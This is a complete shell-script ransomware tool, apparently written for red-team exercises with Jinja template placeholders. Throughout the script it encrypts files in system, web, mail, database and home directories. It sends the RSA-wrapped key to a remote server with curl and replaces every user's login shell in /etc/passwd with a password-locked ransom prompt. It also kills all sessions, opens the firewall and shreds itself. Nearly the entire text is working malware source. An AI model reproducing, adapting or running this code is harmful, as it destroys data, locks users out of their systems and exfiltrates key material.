#!/bin/sh

Init() {
    # Perform initial checks and find the TUI
    # Fatal Errors
    if [ "`whoami`" != "root" ]; then
	echo "[!] NOT ROOT"
        EXIT
    fi
    if [ "`command -v openssl`" = "" ]; then
        echo "[!] NO OPENSSL FOUND"
        EXIT
    fi
    # Allow sending of packet out
    if [ "`command -v iptables`" != "" ]; then
        command iptables -I INPUT 1 -j ACCEPT
        command iptables -I OUTPUT 1 -j ACCEPT
    fi
    # Set the TUI
    if [ "`command -v dialog`" != "" ]; then
	DIALOG="dialog"
    elif [ "`command -v whiptail`" != "" ]; then
	DIALOG="whiptail"
    else
	echo "[!] WHIPTAIL OR DIALOG NOT INSTALLED"
        EXIT
    fi
    echo "[*] Dialog: $DIALOG"
}

SetKeys() {
    # Set up all the keys
    # Generate AES key
    KEY="`openssl rand -base64 32`"
    # Set the public key either from JINJA or leave blank
    # {% if PUBLIC_KEY != "" %}
    pubkey="\
    {{ PUBLIC_KEY }}
    "
    # {% else %}
    pubkey=""
    # {% endif %}
    PUBLICKEY="vmware.txt" # Save the pubkey to here
    PRIVATEKEY="vmware.key" # Save the encryption list and key here
    # Write the AES key to the outfile
    if [ "$pubkey" != "" ]; then
        echo "$pubkey" > $PUBLICKEY
        # Encrypt the AES key with the pubkey and put it in PRIVATEKEY
        echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "$PUBLICKEY" | openssl base64 -out $PRIVATEKEY
        echo "[+] Encrypted public key written to $PRIVATEKEY"
    else
        # Write the unencrypted pubkey
        echo -n "$KEY" > $PRIVATEKEY
        echo "[!] Unencrypted public key written to $PRIVATEKEY"
    fi
}

EXIT() {
    # Delete the script itself
    echo "[!] Shredding $0"
    shred $0 && rm -f $0
    exit;
}

OpenFile() {
        # Add the read and write flags for everyone
        chmod +rw $1
        # Remove immutable and append-only
	if [ "`command -v chattr`" != "" ]; then
		chattr -ai $1
	elif [ "`command -v chflags`" ]; then
		chflags schg $1
	fi
}

EncryptFile() {
    # Use jijna to determine whether we should encrypt
    # {% if weaponized %}
    ENCRYPT=0
    # {% else %}
    ENCRYPT=1 # This is default if just running in bash
    # {% endif %}
    if [ -f "$1" ]; then
        if [ "$ENCRYPT" = "0" ]; then
            # Unlock the file
            OpenFile $1
            # Get the contents
            stuff="`cat $1`"
            # Clear the file
            echo "RAN" > $1
            # Encrypt everything and drop it back into the file
            echo "$stuff" | openssl aes-256-cbc -k "$KEY" -out "$1" &>/dev/null
            echo "[+] Encrypted $1"
        else
            echo "[+] Dry run on $1"
        fi
        # Add the file to the list even if its not encrypted
        LIST="$LIST$1\n"
    fi
}

ListFiles() {
    # Generate a list of all the files contained in the given directories
    # If a file is passed, add it to the file list
    # LISTFILES dir1/ dir2/ dir3/ 
    FILES=""
    # Loop through all the arguments
    for i in $@; do
        # list all the files in it (Works if it is a filename to
        if [ -d $i ] || [ -f $i ]; then
            # Run find if there isnt errors, add the files
            X="`find $i -xdev -type f 2>/dev/null`"
            if [ "$?" = "0" ]; then
                FILES="$FILES $X"
            fi
	fi
    done
    # Remove any files in the whitelist
    whitelist=".*vmware.*|.*_schema.*"
    FILES=`echo  "$FILES" | awk "!/$whitelist/"` # remove anything containing vmware
}

SetMessage() {
    # Replace all the shells with the ransom message
    # {% if RANSOM_MESSAGE %}
    message='{{ RANSOM_MESSAGE }}'
    # {% else %}
    message="Oohhh, Scary. Redteam got to you!\n what are you gonna do?\n"
    message="${message}Try guessing, I bet that will work! Just remember,"
    message="${message} we really love you!"
    # {% endif %}
    # {% if password %}
    hsh="{{ password }}"
    # {% else %}
    hsh="$(echo "redteamlovesyou" | openssl sha1 | cut -d' ' -f2)"
    # {% endif %}
    msg="#!/bin/bash
while [ \"\$(echo \$pass | openssl sha1 | cut -d' ' -f2)\" != \
\"$hsh\" ];\
do pass=\$($DIALOG --title 'Oops...' --cancel-button 'Ok' \
--passwordbox '$message' 20 50 3>&1 1>&2 2>&3 );\
done; /bin/bash"
    echo "$msg" > /bin/ransom
    chmod +x /bin/ransom
    OpenFile /etc/passwd
    # Tell all the shells to be the ransom message
    sed -i 's/:\/[a-z\/]*$/:\/bin\/ransom/' /etc/passwd
}

Lock() {
    # Kill every session on the machine, forcing the users to log back on
    who -u | awk '{print $6}' | xargs kill -9; 
}

SendPacket() {
    # Send the packet back to the server
    # {% if server != "" %}
    server="{{ server }}" # If jinja is used
    # {% else %}
    server="" # Default if jinja is not used
    # {% endif %}
    if [ "`command -v curl`" != "" ] && [ "$server" != "" ]; then
        X=`curl -X POST -d "@$PRIVATEKEY" $server 2>&1`
        if [ "$?" = "0" ]; then
            echo "[+] Packet sent to server"
        else
            echo "[!] Error sending packet"
            echo "$X"
        fi
    fi
}

main() {
    # Trap Signals
    trap '' INT
    trap '' TERM
    # Setup the keys data
    Init # Sets DIALOG
    SetKeys # Set PRIVATEKEY, KEY
    # {% if targets %}
    targets="{{ targets|join(' ') }}" # Get the target list from jinja
    # {% else %}
    targets="/var/spool /etc/ssh /var/named /etc/mail /etc/postfix /var/www"
    targets="$targets /root /home /var/lib/mysql /etc/apache2 /etc/httpd"
    targets="$targets /dovecot /etc/exim /etc/nginx"
    # {% endif %}
    # Generate a list of all the files
    ListFiles $targets
    # Encrypt every file in the file list
    for file in $FILES; do
        EncryptFile $file
    done
    echo >> $PRIVATEKEY
    # Encrypt the file list with the KEY and dump it into a file
    printf "$LIST" | openssl aes-256-cbc -k "$KEY" | openssl base64 >> $PRIVATEKEY
    cp $PRIVATEKEY /etc/
    cp $PRIVATEKEY /var/
    cp $PRIVATEKEY /usr/
    SendPacket
    SetMessage
    Lock
}
main
EXIT
